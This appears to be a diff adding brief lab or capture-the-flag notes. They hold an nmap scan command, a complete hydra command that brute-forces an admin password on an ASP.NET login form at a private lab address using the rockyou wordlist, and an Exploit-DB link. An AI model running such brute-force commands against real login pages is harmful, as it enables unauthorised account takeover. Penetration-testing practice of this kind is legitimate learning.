@@ -1,0 +1,7 @@
+namp -sC -sV -oN x.x.x.x -Pn  (port scan)
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.194.235 http-post-form "/Account/login.aspx:__VIEWSTATE=UYLtvV3eXwjxH1FpXtdfyezKTTuVH1D%2FtoDr%2Bj0vHW5TOR%2FbbMQ0X9YUyA5h9DhzChZtZceagFP2XLFCtSenzrgfgKRFw2VqUKx6uYYxxZgSzRxUWkw9v6fcqJackDOmX8XdxCOT8dSksF7wgmiAM5HW10ZzFnGEZ8mSRSUxZoVNRKW5dtF97IC2YRRDU1KZrkSDgL6E%2BIUwNMpsibY7IEz%2Bj1SEHubbqNr6QU5oLCpfGLY9cqLghOPT%2BSmwBsvIOUYI840YXaWM%2FC3gh%2BoNHA9DTb%2FgCj7aWoPSw3M4NzoIO%2FCB5XOKN8pxkujkqPzh5T8%2Bqc4aIRZm%2B0PHjI9PD9xrh4ZE8bqXGNNzPu2wrL5v%2FnCa&__EVENTVALIDATION=JXzFkNdwVjxPbEkJQDGk1we%2FjfLC%2FIHrtWXl2N0OAmRAu3nv%2BrDniO1dgbwJSobsXFtQ8VxGwi7pM3vynndmZbk4x%2FVvV9E0jV42spGvl1C8hM4Je5UIFyEiY291YZKzs4ENfODHJkHDSNk84Lt5RNpG8NfBu0jCwMgws%2FMFXE05BRvW&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+
+https://www.exploit-db.com/exploits/46353
+
+
